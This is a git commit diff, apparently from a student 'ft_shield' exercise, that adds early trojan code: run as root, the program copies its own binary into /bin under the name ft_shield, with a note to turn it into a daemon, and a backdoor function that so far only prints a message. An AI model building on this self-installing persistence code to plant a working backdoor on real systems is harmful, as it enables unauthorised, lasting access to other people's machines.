ba29539e9639aa20950bc59ed5bd724a5e5655bc
Yellow <y3ll0w42.dev@gmail.com>
2022-05-20 08:06:08 -0400

    duplicate itself

--- includes/ft_shield.h
+++ includes/ft_shield.h
@@ -1,4 +1,20 @@
 #ifndef FT_SHIELD_H
 # define FT_SHIELD_H
 
+# include <fcntl.h>
+# include <libgen.h>
+# include <stdio.h>
+# include <stdlib.h>
+# include <string.h>
+# include <unistd.h>
+
+# define STUDENT_LOGIN "lmartin"
+# define PRG_NAME "ft_shield"
+# define TARGET_LOCATION "/bin"
+# define PROC_SELF_EXE "/proc/self/exe"
+
+# define BUFFER_SIZE 4096
+
+# define MAX_PATH_SIZE 256
+
 #endif
--- srcs/ft_shield.c
+++ srcs/ft_shield.c
@@ -1,6 +1,54 @@
 #include "ft_shield.h"
 
+void	backdoor()
+{
+	printf("backdoor !\n");
+}
+
+void	duplicate(char *path, char *target)
+{
+	char *buffer[BUFFER_SIZE];
+
+	int src_fd = open(path, O_RDONLY);
+	if (src_fd < 0)
+		return ;
+	int target_fd = open(target, O_CREAT | O_TRUNC | O_WRONLY, 0100);
+	if (target_fd < 0)
+	{
+		close(src_fd);
+		return ;
+	}
+	int ret;
+	while ((ret = read(src_fd, buffer, BUFFER_SIZE)))
+		write(target_fd, buffer, ret);
+	close(target_fd);
+	close(src_fd);
+}
+
 int		main(void)
 {
-	return (0);
+	char path[MAX_PATH_SIZE];
+	char bin_path[MAX_PATH_SIZE];
+	char target_path[MAX_PATH_SIZE];
+
+	if (geteuid())
+	{
+		printf("You must be root !\n");
+		return (EXIT_FAILURE);
+	}
+	if (readlink(PROC_SELF_EXE, path, MAX_PATH_SIZE) < 0)
+		return (EXIT_SUCCESS);
+	if (readlink(TARGET_LOCATION, bin_path, MAX_PATH_SIZE) >= 0)
+		sprintf(target_path, "/%s/%s", bin_path, PRG_NAME);
+	else
+		sprintf(target_path, "%s/%s", TARGET_LOCATION, PRG_NAME);
+	if (strcmp(path, target_path))
+	{
+		printf("%s\n", STUDENT_LOGIN);
+		duplicate(PROC_SELF_EXE, target_path);
+		/* TODO: add as daemon */
+	}
+	else
+		backdoor();
+	return (EXIT_SUCCESS);
 }
